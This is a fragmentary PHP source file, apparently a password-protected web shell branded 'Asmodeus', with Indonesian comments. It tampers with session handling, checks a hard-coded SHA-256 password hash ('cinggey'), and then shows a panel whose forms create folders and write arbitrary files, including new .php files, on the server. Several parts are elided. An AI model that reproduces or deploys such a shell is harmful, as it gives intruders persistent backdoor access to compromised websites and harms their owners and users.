...
// Coba atur session save path ke direktori yang dapat ditulis sebelum session_start
if (!is_writable(session_save_path())) {
    $temp_session_path = sys_get_temp_dir();
    if (is_writable($temp_session_path)) {
        session_save_path($temp_session_path);
    }
}

// Mulai sesi dengan penanganan error
if (!session_start()) {
    // Fallback jika sesi gagal: gunakan array lokal sebagai pengganti $_SESSION
...
// Password "cinggey" dienkripsi menggunakan SHA-256
$encrypted_password = '448f78b97281dc4f669fad8881e81377a06630851dacb013b9c62ee6774ec381'; // hash('sha256', 'cinggey')

if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['password'])) {
        // Enkripsi input pengguna dan bandingkan dengan hash yang tersimpan
        if (hash('sha256', $_POST['password']) === $encrypted_password) {
    ...
    // Tampilkan form login jika belum autentikasi
    if (!isset($_SESSION['authenticated'])) {
        ?>
        <html>
            <head>
        ...
        <div class="container-fluid">
            <div class="py-3" id="main">
                <div class="box shadow bg-dark p-4 rounded-3">
                            ...
                            <div class="collapse" id="newFolderCollapse" data-bs-parent="#tools" style="transition:none;">
                                <form action="" method="post">
                                    <div class="mb-3">
                                        ...
                                        <input type="text" class="form-control" name="newFolderName" placeholder="Asmodeus">
                                    </div>
                                    <button type="submit" class="btn btn-outline-light">Submit</button>
                                </form>
                            </div>
                            <div class="collapse" id="newFileCollapse" data-bs-parent="#tools" style="transition:none;">
                                <form action="" method="post">
                                    <div class="mb-3">
                                        ...
                                        <input type="text" class="form-control" name="newFileName" placeholder="Asmodeus.php">
                                    </div>
                                    <div class="mb-3">
                                        <label for="name" class="form-label">File Content</label>
                                        <textarea name="newFileContent" rows="10" class="form-control" placeholder="Hello World - Asmodeus"></textarea>
                                    </div>
                                    <button type="submit" class="btn btn-outline-light">Submit</button>
                                </form>
                            </div>
                    ...
                    <div class="text-light">© Asmodeus <script type='text/javascript'>var creditsyear = new Date();document.write(creditsyear.getFullYear());</script></div>
                </div>
            </div>
        </div>
